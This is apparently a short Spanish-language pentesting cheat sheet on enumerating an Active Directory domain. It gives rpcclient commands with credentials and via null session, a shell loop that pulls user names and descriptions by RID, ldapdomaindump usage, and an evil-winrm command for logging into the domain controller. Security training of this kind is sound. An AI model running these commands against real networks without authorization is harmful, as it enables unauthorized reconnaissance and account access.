# Formas de enumerar el dominio

## Enumerar los usuarios del dominio con rpcclient
Para hacer esto debemos conocer unas credenciales de usuario válidas, no hace falta que sean privilegiadas.
```
rpcclient -U "<nombre_dominio>\<usuario>%<contraseña>" <IP_DC> '<enumdomusers>'
```
[Ver ejemplo](Images/users/README.md)

## Enumerar los usuarios del dominio con rpcclient mediante un Null Session
```
rpcclient -U '' <IP_DC> -N
```

## Listar información de usuarios mediante el rid.
Hay veces que enumerando los usuarios podremos encontrar información valiosa en sus descripciones
```
for rid in $(rpcclient -U "<nombre_dominio>\<usuario>%<contraseña>" <IP_DC> '<enumdomusers>' | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]'); do echo -e "\n[+] Para el RID $rid:\n"; rpcclient -U "<nombre_dominio>\<usuario>%<contraseña>" <IP_DC> "queryuser $rid" | grep -E -i "user name|description";done
```
[Ver ejemplo](Images/rid/README.md)

## Usar ldapdomaindump para representar la información en HTML
Para hacer esto debemos conocer unas credenciales de usuario válidas, no hace falta que sean privilegiadas. Tendremos que habilitar el servicio apache2 y cuando accedamos a nuestro localhost veremos toda la información representada en la web.
```
service apache2 start
```
```
python3 ldapdomaindump.py -u '<nombre_dominio>\<usuario>' -p '<contraseña>' <IP_DC>
```
[Ver directory listing](Images/web/README.md)

[Ver ejemplo](Images/web2/README.md)

## Conectarnos al sistema como un usuario
Siemore que tengamos unas credenciales válidas podemos intentar conectarnos con evil-winrm para ganar acceso.
```
evil-winrm -u '<usuario>' -p '<contraseña>' -i <DC_IP>
```
